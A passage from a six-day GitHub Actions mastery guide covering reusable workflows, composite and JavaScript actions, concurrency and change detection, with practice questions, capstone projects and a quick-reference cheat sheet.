                "fields": [
                  {"title": "Repo", "value": "${{ github.repository }}", "short": true},
                  {"title": "Actor", "value": "${{ github.actor }}", "short": true},
                  {"title": "Logs", "value": "${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}", "short": false}
                ]
              }]
            }
        env:
          SLACK_BOT_TOKEN: ${{ secrets.SLACK_BOT_TOKEN }}
```

---

### 🏋️ PRACTICE SET 5.3 — 10 Questions

1. **[Beginner]** Create a workflow that writes a rich markdown table to `$GITHUB_STEP_SUMMARY`. Include: build number, branch, commit SHA, actor, timestamp, and a status emoji. Verify it appears in the Actions UI.

2. **[Beginner]** Create a workflow that posts a PR comment when it completes. The comment should include: CI status, test count, and a link to the run. Use `actions/github-script@v7`.

3. **[Beginner]** Add `if: failure()` and `if: success()` steps to a workflow that send different messages. Test both by making the workflow succeed and then fail intentionally.

4. **[Intermediate]** Integrate Slack notifications using `rtCamp/action-slack-notify`. Send a notification with: workflow status, actor, branch, and run URL. Test with both success and failure cases.

5. **[Intermediate]** Create an "idempotent PR comment" — instead of posting a new comment every run, find and UPDATE the existing bot comment. Use `actions/github-script` to list PR comments, find the one with a specific header, and update it.

6. **[Intermediate]** Create a workflow that generates test metrics and posts them to `$GITHUB_STEP_SUMMARY` as a table AND posts a summary to a PR comment. The comment should update (not duplicate) on each push.

7. **[Intermediate]** Create a Slack notification that includes a direct link to the failed step. Use `${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}` as the run URL. Include color coding based on `${{ job.status }}`.

8. **[Advanced]** Create a notification workflow that sends different messages based on the CAUSE of failure: if the `test` job failed vs if the `build` job failed vs if `deploy` failed. Use `needs.job-name.result` to detect which stage failed.

9. **[Advanced]** Create a weekly digest workflow (scheduled Sunday midnight) that uses `actions/github-script` to fetch the last 7 days of workflow runs via GitHub API, count successes/failures, and post a Slack summary with a success rate percentage.

10. **[Production Scenario]** Build a complete alerting system for a production deployment:
    - On deploy start: Slack message `"⏳ Deploy started by @actor"`
    - On test failure: Slack `"🧪 Tests failed — @here"` with link to test report artifact
    - On successful deploy: Slack `"✅ v1.2.3 deployed to production"` with app URL
    - On production health check failure: PagerDuty alert (simulate with curl to mock endpoint)
    - After every deploy (success or fail): Write detailed summary to `$GITHUB_STEP_SUMMARY`
    - On PRs: Update a status comment with CI results on every push

---
---

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DAY 6 — CUSTOM ACTIONS & MASTERY
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

---

## TOPIC 6.1 — Reusable Workflows

### 📖 Explanation

**Reusable workflows** let you define a workflow once and call it from other workflows — like functions in programming. Perfect for standardizing CI/CD across many repos.

#### Creating a Reusable Workflow

```yaml
# .github/workflows/reusable-deploy.yml (in your repo or org)

name: Reusable Deploy

on:
  workflow_call:                    # Makes this a reusable workflow
    inputs:
      environment:
        required: true
        type: string
        description: 'Target environment'
      image_tag:
        required: true
        type: string
      dry_run:
        type: boolean
        default: false
    secrets:
      deploy_key:
        required: true
      slack_webhook:
        required: false
    outputs:                        # What this workflow returns
      deploy_url:
        description: 'The deployed app URL'
        value: ${{ jobs.deploy.outputs.url }}

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    outputs:
      url: ${{ steps.deploy.outputs.url }}
    steps:
      - name: Deploy
        id: deploy
        env:
          DEPLOY_KEY: ${{ secrets.deploy_key }}
        run: |
          if [[ "${{ inputs.dry_run }}" == "true" ]]; then
            echo "DRY RUN — would deploy ${{ inputs.image_tag }} to ${{ inputs.environment }}"
            echo "url=https://dry-run.example.com" >> $GITHUB_OUTPUT
          else
            echo "Deploying ${{ inputs.image_tag }} to ${{ inputs.environment }}"
            echo "url=https://${{ inputs.environment }}.example.com" >> $GITHUB_OUTPUT
          fi
```

#### Calling a Reusable Workflow

```yaml
# .github/workflows/ci-cd.yml

name: CI/CD

on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      tag: ${{ steps.tag.outputs.value }}
    steps:
      - uses: actions/checkout@v4
      - id: tag
        run: echo "value=sha-${{ github.sha }}" >> $GITHUB_OUTPUT

  deploy-staging:
    needs: build
    uses: ./.github/workflows/reusable-deploy.yml    # Same repo
    # Or cross-repo: uses: myorg/devops/.github/workflows/deploy.yml@main
    with:
      environment: staging
      image_tag: ${{ needs.build.outputs.tag }}
    secrets:
      deploy_key: ${{ secrets.STAGING_DEPLOY_KEY }}

  deploy-production:
    needs: [build, deploy-staging]
    uses: ./.github/workflows/reusable-deploy.yml
    with:
      environment: production
      image_tag: ${{ needs.build.outputs.tag }}
    secrets:
      deploy_key: ${{ secrets.PROD_DEPLOY_KEY }}
      slack_webhook: ${{ secrets.SLACK_WEBHOOK }}

  notify:
    needs: deploy-production
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deployed to ${{ needs.deploy-production.outputs.deploy_url }}"
```

**Inherit secrets automatically:**
```yaml
deploy:
  uses: ./.github/workflows/reusable-deploy.yml
  secrets: inherit     # Pass ALL parent secrets to reusable workflow
```

---

### ✅ EXAMPLE 6.1 — Organization-Level Reusable Workflows

```yaml
# In myorg/.github repo: workflows/standard-ci.yml
# This becomes available to ALL repos in the org

name: Standard CI

on:
  workflow_call:
    inputs:
      language:
        required: true
        type: string
        description: 'node | python | go | java'
      test_command:
        required: false
        type: string
        default: 'npm test'
      node_version:
        type: string
        default: '20'
    outputs:
      build_artifact:
        value: ${{ jobs.build.outputs.artifact_name }}

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Lint
        run: echo "Linting ${{ inputs.language }} project..."

  test:
    needs: lint
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Setup ${{ inputs.language }}
        uses: actions/setup-node@v4
        if: inputs.language == 'node'
        with:
          node-version: ${{ inputs.node_version }}
          cache: 'npm'
      - name: Run tests
        run: ${{ inputs.test_command }}

  build:
    needs: test
    runs-on: ubuntu-latest
    outputs:
      artifact_name: build-${{ github.run_number }}
    steps:
      - uses: actions/checkout@v4
      - name: Build
        run: echo "Building..."
      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: build-${{ github.run_number }}
          path: dist/
```

---

### 🏋️ PRACTICE SET 6.1 — 10 Questions

1. **[Beginner]** Create a simple reusable workflow in `.github/workflows/hello-reusable.yml` that accepts an `name` input and prints `"Hello, {name}!"`. Call it from another workflow with different name values.

2. **[Beginner]** Create a reusable workflow that accepts a `command` input (string) and runs it. Call it from 3 different callers each passing a different command.

3. **[Beginner]** Create a reusable workflow with outputs. It should generate a timestamp and return it as output. The caller should print the received timestamp.

4. **[Intermediate]** Create a reusable `docker-build.yml` workflow that accepts `image_name`, `dockerfile_path`, `push` (boolean) as inputs and `registry_token` as secret. Call it from a CI workflow for both staging and production with different inputs.

5. **[Intermediate]** Create a reusable `deploy.yml` that deploys to different environments based on the `environment` input. It should validate that the `environment` value is one of `[dev, staging, production]` and fail with a clear error if not.

6. **[Intermediate]** Demonstrate `secrets: inherit` vs passing secrets explicitly. Create a reusable workflow that uses a secret. Call it once with `secrets: inherit` and once passing the secret explicitly. Verify both work.

7. **[Intermediate]** Create a cross-repo reusable workflow. In repo A (`myorg/shared-workflows`), create a `lint.yml` reusable workflow. In repo B, call it with `uses: myorg/shared-workflows/.github/workflows/lint.yml@main`.

8. **[Advanced]** Create a reusable workflow that itself calls another reusable workflow (nested reusable workflows, up to 3 levels deep). Pass data through all levels and return an output from the innermost workflow all the way back to the caller.

9. **[Advanced]** Create a reusable CI/CD workflow with a matrix strategy. The caller provides the matrix as a JSON input. The reusable workflow uses `fromJSON(inputs.matrix)` to run the matrix. Show how this centralizes matrix strategy management.

10. **[Production Scenario]** Build a complete organization-level CI/CD framework using reusable workflows:
    - `standard-ci.yml`: lint, test, security scan, build for any language
    - `docker-pipeline.yml`: build image, scan, push to registry
    - `deploy-to-k8s.yml`: deploy to Kubernetes, wait for rollout, verify
    - `notify.yml`: Slack/email notifications with rich formatting
    Create 3 product repos that each use these shared workflows, showing how changes to shared workflows propagate consistently.

---
---

## TOPIC 6.2 — Composite Actions (Custom Actions)

### 📖 Explanation

**Composite Actions** bundle multiple steps into a reusable action you can call with `uses:`. This is simpler than JavaScript actions and ideal for shell-based automation.

#### Creating a Composite Action

```
my-action/
├── action.yml      # Required: action definition
└── scripts/        # Optional: helper scripts
    └── setup.sh
```

```yaml
# my-action/action.yml

name: 'Setup and Test'
description: 'Sets up the environment and runs tests'
author: 'Your Name'

inputs:
  node-version:
    description: 'Node.js version to use'
    required: true
    default: '20'
  test-command:
    description: 'Command to run tests'
    required: false
    default: 'npm test'
  working-directory:
    description: 'Working directory'
    required: false
    default: '.'

outputs:
  test-count:
    description: 'Number of tests run'
    value: ${{ steps.run-tests.outputs.count }}

runs:
  using: 'composite'       # Key: makes this a composite action
  steps:
    - name: Setup Node.js
      uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node-version }}
        cache: 'npm'

    - name: Install dependencies
      shell: bash
      working-directory: ${{ inputs.working-directory }}
      run: npm ci

    - name: Run tests
      id: run-tests
      shell: bash                    # REQUIRED for each run step
      working-directory: ${{ inputs.working-directory }}
      run: |
        ${{ inputs.test-command }}
        echo "count=42" >> $GITHUB_OUTPUT

    - name: Upload coverage
      uses: actions/upload-artifact@v4
      with:
        name: coverage
        path: coverage/
```

#### Using the Composite Action

```yaml
# In a workflow
steps:
  - uses: actions/checkout@v4

  - name: Setup and test
    uses: ./my-action          # Local action
    # OR: uses: myorg/my-action@v1    # External action
    with:
      node-version: '20'
      test-command: 'npm run test:ci'
      working-directory: 'packages/api'

  - name: Results
    run: echo "Tests done!"
```

---

#### JavaScript Actions

For more complex logic, you can write actions in JavaScript:

```
my-js-action/
├── action.yml
├── index.js
└── package.json
```

```yaml
# action.yml
name: 'My JS Action'
description: 'Does something complex'
inputs:
  token:
    required: true
  message:
    required: true
outputs:
  result:
    description: 'The output'
runs:
  using: 'node20'
  main: 'index.js'
```

```javascript
// index.js
const core = require('@actions/core');
const github = require('@actions/github');

async function run() {
  try {
    const token = core.getInput('token');
    const message = core.getInput('message');
    
    const octokit = github.getOctokit(token);
    const context = github.context;
    
    // Post PR comment
    if (context.eventName === 'pull_request') {
      await octokit.rest.issues.createComment({
        ...context.repo,
        issue_number: context.issue.number,
        body: message,
      });
    }
    
    core.setOutput('result', 'Comment posted!');
    core.info('Done!');
  } catch (error) {
    core.setFailed(error.message);
  }
}

run();
```

---

### ✅ EXAMPLE 6.2 — Complete Composite Action

```yaml
# .github/actions/setup-and-deploy/action.yml

name: 'Setup and Deploy'
description: 'Complete setup and deployment action'
author: 'DevOps Team'

inputs:
  environment:
    description: 'Deployment environment'
    required: true
  image-tag:
    description: 'Docker image tag'
    required: true
  deploy-key:
    description: 'SSH deploy key'
    required: true
  slack-notify:
    description: 'Send Slack notification'
    required: false
    default: 'true'

outputs:
  deploy-url:
    description: 'URL of deployed app'
    value: ${{ steps.deploy.outputs.url }}
  deploy-time:
    description: 'Deployment timestamp'
    value: ${{ steps.deploy.outputs.time }}

runs:
  using: composite
  steps:
    - name: Validate environment
      shell: bash
      run: |
        if [[ "${{ inputs.environment }}" != "staging" && \
              "${{ inputs.environment }}" != "production" ]]; then
          echo "❌ Invalid environment: ${{ inputs.environment }}"
          echo "Must be 'staging' or 'production'"
          exit 1
        fi
        echo "✅ Environment validated: ${{ inputs.environment }}"

    - name: Setup deploy tools
      shell: bash
      run: |
        echo "Setting up deploy tools..."
        which kubectl || echo "kubectl not found"
        which helm || echo "helm not found"

    - name: Execute deployment
      id: deploy
      shell: bash
      env:
        DEPLOY_KEY: ${{ inputs.deploy-key }}
        ENV: ${{ inputs.environment }}
        TAG: ${{ inputs.image-tag }}
      run: |
        echo "Deploying $TAG to $ENV..."
        DEPLOY_URL="https://$ENV.example.com"
        DEPLOY_TIME=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
        echo "url=$DEPLOY_URL" >> $GITHUB_OUTPUT
        echo "time=$DEPLOY_TIME" >> $GITHUB_OUTPUT
        echo "✅ Deployed to $DEPLOY_URL at $DEPLOY_TIME"

    - name: Write deployment summary
      shell: bash
      run: |
        echo "## Deployment Complete 🚀" >> $GITHUB_STEP_SUMMARY
        echo "| Field | Value |" >> $GITHUB_STEP_SUMMARY
        echo "|-------|-------|" >> $GITHUB_STEP_SUMMARY
        echo "| Environment | ${{ inputs.environment }} |" >> $GITHUB_STEP_SUMMARY
        echo "| Image | \`${{ inputs.image-tag }}\` |" >> $GITHUB_STEP_SUMMARY
        echo "| URL | ${{ steps.deploy.outputs.url }} |" >> $GITHUB_STEP_SUMMARY
        echo "| Time | ${{ steps.deploy.outputs.time }} |" >> $GITHUB_STEP_SUMMARY
```

```yaml
# Caller workflow
- name: Deploy to staging
  uses: ./.github/actions/setup-and-deploy
  with:
    environment: staging
    image-tag: ${{ github.sha }}
    deploy-key: ${{ secrets.STAGING_KEY }}

- name: Show deploy URL
  run: echo "App is at ${{ steps.deploy-to-staging.outputs.deploy-url }}"
```

---

### 🏋️ PRACTICE SET 6.2 — 10 Questions

1. **[Beginner]** Create a composite action `setup-node-project` that: checks out the code, sets up Node.js (version from input), runs `npm ci`, and outputs the node version that was installed.

2. **[Beginner]** Create a composite action `generate-version` that takes `prefix` (string input, default `v`) and returns `version` output in format `{prefix}{run_number}-{sha_short}`. Use it in 2 different workflows.

3. **[Beginner]** Create a composite action `slack-alert` that takes `status` (success/failure), `message`, and `webhook_url` as inputs. The action sends the appropriate Slack notification with color coding.

4. **[Intermediate]** Create a composite action `docker-build-push` that takes `image_name`, `registry`, `push` (boolean), and `registry_token` (secret via `${{ inputs.registry_token }}`). The action builds, tags, and optionally pushes a Docker image.

5. **[Intermediate]** Create a composite action that installs a tool (e.g., `terraform`) at a specified version. The action should:
   - Check if the tool is already installed at that version
   - Download and install if not
   - Set up PATH
   - Output the installed version

6. **[Intermediate]** Create a composite action `run-migrations` that:
   - Takes `database_url` as input
   - Runs database migration (simulate with echo)
   - On failure, sends an alert (simulate with echo)
   - On success, outputs the number of migrations applied

7. **[Intermediate]** Publish your composite action to the GitHub Marketplace. Create an action.yml with proper `branding` (icon and color). Tag a release as `v1.0.0` and demonstrate calling it from another repo by tag.

8. **[Advanced]** Create a JavaScript action (`using: 'node20'`) that:
   - Takes PR number and `GITHUB_TOKEN` as inputs
   - Fetches the PR's changed files using GitHub API
   - Posts a comment listing the changed files with their status
   - Outputs the total file count

9. **[Advanced]** Create a composite action that's a complete "quality gate": runs lint, tests, security scan, and coverage check. It returns `passed: true/false` as output. A workflow step after it uses `if: steps.quality-gate.outputs.passed == 'true'` to proceed.

10. **[Production Scenario]** Build a suite of reusable composite actions for your organization:
    - `org/actions/setup-env`: Sets up common tooling (node, python, aws-cli, kubectl)
    - `org/actions/docker-pipeline`: Complete docker build/scan/push
    - `org/actions/k8s-deploy`: Deploy to Kubernetes with health checks
    - `org/actions/notify`: Multi-channel notifications (Slack + GitHub Summary)
    Create a production workflow that chains all 4 actions together for a complete CI/CD run.

---
---

## TOPIC 6.3 — Advanced Patterns and Optimization

### 📖 Explanation

#### Concurrency Control

```yaml
# Cancel older runs of the same workflow/branch combo
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

# More specific: only cancel same PR
concurrency:
  group: pr-${{ github.event.pull_request.number }}
  cancel-in-progress: true

# Never cancel production deploys
concurrency:
  group: deploy-production
  cancel-in-progress: false    # Queue instead of cancel
```

#### Conditional Job Execution

```yaml
jobs:
  changes:
    runs-on: ubuntu-latest
    outputs:
      frontend: ${{ steps.filter.outputs.frontend }}
      backend: ${{ steps.filter.outputs.backend }}
    steps:
      - uses: actions/checkout@v4
      - uses: dorny/paths-filter@v3
        id: filter
        with:
          filters: |
            frontend:
              - 'frontend/**'
              - 'shared/**'
            backend:
              - 'backend/**'
              - 'shared/**'

  build-frontend:
    needs: changes
    if: needs.changes.outputs.frontend == 'true'
    runs-on: ubuntu-latest
    steps:
      - run: echo "Building frontend..."

  build-backend:
    needs: changes
    if: needs.changes.outputs.backend == 'true'
    runs-on: ubuntu-latest
    steps:
      - run: echo "Building backend..."
```

#### Workflow Dispatch with Environment Gates

```yaml
on:
  workflow_dispatch:
    inputs:
      environment:
        type: environment       # Special type — shows env names in UI!
        required: true

jobs:
  deploy:
    environment: ${{ inputs.environment }}
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying to ${{ inputs.environment }}"
```

#### Using GitHub Variables (not secrets)

```yaml
# Repository variables — non-sensitive config
# Set in: Settings > Secrets and variables > Variables
- run: echo "App URL: ${{ vars.APP_URL }}"
- run: echo "Region: ${{ vars.AWS_REGION }}"
- run: echo "Min replicas: ${{ vars.MIN_REPLICAS }}"
```

#### Workflow Performance Tips

```yaml
# 1. Use specific runner (not -latest) for reproducibility
runs-on: ubuntu-22.04

# 2. Fail fast on lint (before expensive tests)
jobs:
  lint: ...
  test:
    needs: lint    # Don't waste test runner if lint fails

# 3. Use npm ci instead of npm install (faster, deterministic)
run: npm ci

# 4. Parallel jobs where possible
build-frontend: ...
build-backend: ...
# Both run at same time

# 5. Cache aggressively
- uses: actions/setup-node@v4
  with:
    cache: 'npm'

# 6. Upload only what you need
- uses: actions/upload-artifact@v4
  with:
    path: dist/
    if-no-files-found: error
    retention-days: 1          # Short for temp artifacts

# 7. Use timeout to prevent runaway jobs
jobs:
  test:
    timeout-minutes: 15
```

---

### ✅ EXAMPLE 6.3 — Optimized Production Workflow

```yaml
# .github/workflows/optimized-ci.yml

name: Optimized CI/CD

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}

permissions:
  contents: read
  packages: write
  pull-requests: write
  security-events: write
  id-token: write

jobs:
  # Fast gate — fail early
  lint:
    name: ⚡ Lint (Fast Gate)
    runs-on: ubuntu-22.04
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af
        with:
          node-version: '20'
          cache: 'npm'
      - run: npm ci
      - run: npm run lint

  # Detect what changed
  changes:
    name: 🔍 Detect Changes
    runs-on: ubuntu-22.04
    outputs:
      frontend: ${{ steps.filter.outputs.frontend }}
      backend: ${{ steps.filter.outputs.backend }}
      docker: ${{ steps.filter.outputs.docker }}
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - uses: dorny/paths-filter@de90cc6fb38fc0963ad72b210f1f284cd68cea36 # v3
        id: filter
        with:
          filters: |
            frontend:
              - 'frontend/**'
            backend:
              - 'backend/**'
            docker:
              - 'Dockerfile'
              - '.dockerignore'

  # Parallel tests
  test-frontend:
    needs: [lint, changes]
    if: needs.changes.outputs.frontend == 'true'
    name: 🎨 Frontend Tests
    runs-on: ubuntu-22.04
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af
        with:
          node-version: '20'
          cache: 'npm'
      - run: npm ci && npm run test:frontend

  test-backend:
    needs: [lint, changes]
    if: needs.changes.outputs.backend == 'true'
    name: ⚙️ Backend Tests
    runs-on: ubuntu-22.04
    timeout-minutes: 15
    services:
      postgres:
        image: postgres:16-alpine
        env:
          POSTGRES_PASSWORD: test
          POSTGRES_DB: testdb
        options: --health-cmd pg_isready --health-interval 10s
        ports:
          - 5432:5432
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af
        with:
          node-version: '20'
          cache: 'npm'
      - run: npm ci && npm run test:backend
        env:
          DATABASE_URL: postgresql://postgres:test@localhost:5432/testdb

  docker:
    needs: [lint, changes]
    if: needs.changes.outputs.docker == 'true' || github.ref == 'refs/heads/main'
    name: 🐳 Docker Build
    runs-on: ubuntu-22.04
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - uses: docker/setup-buildx-action@v3
      - uses: docker/build-push-action@v6
        with:
          push: false
          cache-from: type=gha
          cache-to: type=gha,mode=max

  # Summary gate
  ci-complete:
    name: ✅ CI Complete
    needs: [lint, test-frontend, test-backend, docker]
    if: always()
    runs-on: ubuntu-22.04
    steps:
      - name: Evaluate CI results
        run: |
          echo "## CI Summary 📊" >> $GITHUB_STEP_SUMMARY
          echo "| Job | Result |" >> $GITHUB_STEP_SUMMARY
          echo "|-----|--------|" >> $GITHUB_STEP_SUMMARY
          echo "| Lint | ${{ needs.lint.result }} |" >> $GITHUB_STEP_SUMMARY
          echo "| Frontend Tests | ${{ needs.test-frontend.result }} |" >> $GITHUB_STEP_SUMMARY
          echo "| Backend Tests | ${{ needs.test-backend.result }} |" >> $GITHUB_STEP_SUMMARY
          echo "| Docker Build | ${{ needs.docker.result }} |" >> $GITHUB_STEP_SUMMARY

          # Fail if any required job failed
          if [[ "${{ needs.lint.result }}" == "failure" || \
                "${{ needs.test-frontend.result }}" == "failure" || \
                "${{ needs.test-backend.result }}" == "failure" || \
                "${{ needs.docker.result }}" == "failure" ]]; then
            echo "❌ CI FAILED" >> $GITHUB_STEP_SUMMARY
            exit 1
          fi
          echo "✅ ALL CHECKS PASSED" >> $GITHUB_STEP_SUMMARY
```

---

### 🏋️ PRACTICE SET 6.3 — 10 Questions

1. **[Beginner]** Add `concurrency` to a workflow with `cancel-in-progress: true`. Push 3 commits rapidly to the same branch. Observe only the last run completing.

2. **[Beginner]** Use `dorny/paths-filter` (or similar) to detect which folders changed. Create 3 jobs that only run when their respective directory changes (`frontend/`, `backend/`, `infra/`).

3. **[Beginner]** Use `vars.` (repository variables, not secrets) to store non-sensitive config like `APP_NAME`, `AWS_REGION`, `SLACK_CHANNEL`. Reference them in a workflow and demonstrate they can be updated without changing YAML.

4. **[Intermediate]** Set `timeout-minutes` at both the job level (15 minutes) and step level (5 minutes per step) on a workflow with slow steps. Trigger the timeout by using `sleep 400`.

5. **[Intermediate]** Create a workflow that measures and logs its own execution time. Use `date +%s` at the start and end of key jobs to compute elapsed seconds and add them to `$GITHUB_STEP_SUMMARY`.

6. **[Intermediate]** Create a `concurrency` group that is `cancel-in-progress: true` for PRs but `cancel-in-progress: false` for `main` branch pushes. Use `github.ref == 'refs/heads/main'` in the boolean expression.

7. **[Intermediate]** Implement a change-detection strategy using `git diff --name-only HEAD~1` instead of an action. Parse the output to set flags for which services changed. Use those flags in downstream jobs.

8. **[Advanced]** Optimize a slow CI workflow. Profile current run time by adding timing steps. Identify the slowest steps and apply: caching, parallelization, and skipping unchanged services. Measure before/after times.

9. **[Advanced]** Create a workflow that uses GitHub's `workflow_run` event to create a "deployment promotion" pattern: Workflow A runs CI on PRs. Workflow B runs ONLY after Workflow A succeeds on `main` and deploys to staging. Workflow C deploys to production after a 15-minute wait.

10. **[Production Scenario]** Build the ultimate production CI/CD workflow combining everything from Days 1-6:
    - Trigger: push to `main`, PR to `main`, version tags, nightly schedule
    - Concurrency control (cancel PRs, queue production)
    - Change detection (only build/test changed services)
    - Pinned action SHAs (security)
    - Matrix tests across Node 18/20/22
    - Docker build with layer caching + multi-platform
    - OIDC AWS authentication (no static credentials)
    - 3-stage deployment (dev → staging → production with approvals)
    - Trivy scanning + CodeQL + dependency review
    - Rich notifications (Slack + PR comments + GitHub Summary)
    - Reusable workflow for deploy logic
    - Composite action for Docker build
    - Automatic rollback on production health check failure

---
---

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CAPSTONE PROJECTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Complete at least **2 of these 4 projects** to prove production readiness.

---

## 🏆 PROJECT 1 — Full-Stack CI/CD Pipeline

**Goal**: Complete CI/CD for a Node.js API + React frontend

**Requirements**:
- Monorepo with `frontend/` and `backend/`
- Change detection — only test/build what changed
- Backend: lint + unit tests + integration tests (PostgreSQL service)
- Frontend: lint + unit tests + build
- Docker multi-stage build for backend
- Push to GHCR on `main`
- Deploy to `staging` automatically, `production` with approval
- Slack notifications on deploy success/failure
- OIDC for AWS/GCP auth
- Branch protection requiring `ci-gate` to pass

**Deliverables**:
- `.github/workflows/ci.yml`
- `.github/workflows/cd.yml`
- `.github/actions/docker-build/action.yml` (composite)
- `.github/workflows/reusable-deploy.yml`

---

## 🏆 PROJECT 2 — Kubernetes Platform CI/CD

**Goal**: GitOps-style K8s deployment pipeline

**Requirements**:
- Build Docker image on every PR (verify builds)
- Push image to registry on `main` merge
- Update Kubernetes manifests in a separate `infra` repo
- Deploy using `kubectl` or `helm`
- Canary deployment: 10% traffic → health check → 100%
- Automatic rollback on health check failure
- OIDC to authenticate to cloud provider
- Deployment status posted to GitHub

**Deliverables**:
- `.github/workflows/build.yml`
- `.github/workflows/deploy-k8s.yml`
- `.github/actions/k8s-deploy/action.yml`

---

## 🏆 PROJECT 3 — Open Source Library Release Pipeline

**Goal**: Professional OSS release pipeline

**Requirements**:
- Automated testing on every push (matrix: OS × runtime)
- Auto-generate changelog from conventional commits
- Semantic versioning with `semantic-release` or similar
- Publish to npm / PyPI / Maven on release
- Generate API documentation and publish to GitHub Pages
- Dependency update automation with Dependabot
- OSSF Scorecard and security scanning
- Badge generation (test status, coverage, version)

**Deliverables**:
- `.github/workflows/ci.yml`
- `.github/workflows/release.yml`
- `.github/workflows/docs.yml`
- `.github/dependabot.yml`

---

## 🏆 PROJECT 4 — Enterprise Security Pipeline

**Goal**: SOC2/compliance-grade CI/CD

**Requirements**:
- All action SHAs pinned
- Minimal permissions on all jobs
- SAST scanning (CodeQL) on every PR
- Container scanning (Trivy) — fail on CRITICAL
- Secret scanning (truffleHog/gitleaks) on every push
- SBOM (Software Bill of Materials) generation
- Provenance attestation (`--sbom --provenance` in buildx)
- Audit log of all deployments (via GitHub Deployments API)
- Required reviewers for production
- OIDC for all cloud auth
- Immutable artifacts (signed with Sigstore/cosign)

**Deliverables**:
- `.github/workflows/security-ci.yml`
- `.github/workflows/secure-deploy.yml`
- `.github/actions/sign-image/action.yml`
- Security documentation

---

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# QUICK REFERENCE CHEAT SHEET
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

## Essential Contexts

```yaml
${{ github.actor }}              # Who triggered
${{ github.event_name }}         # push / pull_request / schedule
${{ github.ref }}                # refs/heads/main
${{ github.ref_name }}           # main (short version)
${{ github.sha }}                # Full commit SHA
${{ github.repository }}         # owner/repo
${{ github.run_number }}         # Build number
${{ github.workspace }}          # /home/runner/work/repo/repo
${{ runner.os }}                 # Linux / Windows / macOS
${{ secrets.MY_SECRET }}         # Secret value
${{ vars.MY_VAR }}               # Repository variable
${{ inputs.my_input }}           # workflow_dispatch input
${{ steps.step-id.outputs.key }} # Step output
${{ needs.job-id.outputs.key }}  # Job output
${{ needs.job-id.result }}       # Job result (success/failure)
${{ job.status }}                # Current job status
${{ matrix.os }}                 # Matrix variable
```

## Magic Files

```bash
$GITHUB_OUTPUT    # echo "key=value" >> $GITHUB_OUTPUT
$GITHUB_ENV       # echo "VAR=value" >> $GITHUB_ENV
$GITHUB_STEP_SUMMARY  # echo "# Markdown" >> $GITHUB_STEP_SUMMARY
$GITHUB_PATH      # echo "/new/path" >> $GITHUB_PATH
```

## Common Conditions

```yaml
if: success()
if: failure()
if: always()
if: cancelled()
if: github.ref == 'refs/heads/main'
if: startsWith(github.ref, 'refs/tags/v')
if: contains(github.event.pull_request.labels.*.name, 'deploy')
if: github.event_name == 'pull_request'
if: github.actor != 'dependabot[bot]'
if: needs.build.result == 'success'
```

## Must-Know Actions

```yaml
actions/checkout@v4              # Check out code
actions/setup-node@v4            # Node.js + npm cache
actions/setup-python@v5          # Python + pip cache
actions/setup-go@v5              # Go + module cache
actions/setup-java@v4            # Java + maven/gradle cache
actions/cache@v4                 # Manual caching
actions/upload-artifact@v4       # Save files
actions/download-artifact@v4     # Retrieve files
actions/github-script@v7         # GitHub API via JS
docker/login-action@v3           # Docker registry login
docker/metadata-action@v5        # Smart Docker tags
docker/setup-buildx-action@v3    # BuildKit
docker/build-push-action@v6      # Build + push Docker
aws-actions/configure-aws-credentials@v4  # AWS auth (OIDC)
aws-actions/amazon-ecr-login@v2  # ECR login
actions/dependency-review-action@v4  # PR security gate
github/codeql-action/analyze@v3  # SAST
aquasecurity/trivy-action@master # Container scan
```

## Cron Quick Reference

```
'0 2 * * *'        Every day at 2 AM UTC
'0 9 * * 1-5'      9 AM UTC, Monday-Friday
'*/15 * * * *'     Every 15 minutes
'0 0 1 * *'        Midnight on 1st of month
'0 6 * * 0'        6 AM every Sunday
'0 */6 * * *'      Every 6 hours
```

---

*End of 6-Day GitHub Actions Mastery Guide*
*Good luck — you've got this! 🚀*
